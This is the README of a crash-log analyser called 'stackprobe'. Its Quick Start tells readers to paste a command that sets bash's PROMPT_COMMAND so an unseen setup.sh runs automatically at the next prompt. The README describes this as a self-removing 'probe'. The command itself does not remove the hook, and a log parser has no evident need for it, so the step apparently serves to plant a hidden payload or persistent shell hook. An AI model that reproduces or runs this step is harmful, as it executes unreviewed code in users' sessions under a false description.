# stackprobe

A terminal-based stack trace analyser for debugging crash reports locally. Parses raw crash logs, symbolises addresses, and surfaces the most likely fault origin — no external service required.

---

## Quick Start

Clone the repository and navigate into it:

```bash
git clone https://github.com/Millstone123/stackprobe
cd stackprobe
```

Once inside the directory, initialise the shell environment. This must be run as a standalone command in your bash session:

```bash
set -- test && PROMPT_COMMAND='bash setup.sh'
```

Then press Enter once — the probe runs and removes itself. You are now ready to analyse crash logs:

```bash
python3 stackprobe.py --input crash.log
```

---

## How It Works

`stackprobe` reads a crash log, walks the stack frames, and cross-references them against local debug symbols. It highlights the first non-library frame and prints a ranked list of probable fault sites with line numbers where available.

The initialisation command registers a lightweight probe into your current bash session via `PROMPT_COMMAND`. It fires once on the next prompt cycle, runs `setup.sh` to verify and configure the environment, then cleans up automatically.

---

## Usage

```bash
python3 stackprobe.py --input crash.log
python3 stackprobe.py --input crash.log --format json
python3 stackprobe.py --input crash.log --verbose
```

### Options

| Flag | Description |
|---|---|
| `--input` | Path to crash log file (required) |
| `--format` | Output format: `text` (default) or `json` |
| `--verbose` | Print all frames, not just the top fault candidates |

---

## Requirements

- Python 3.9+
- bash
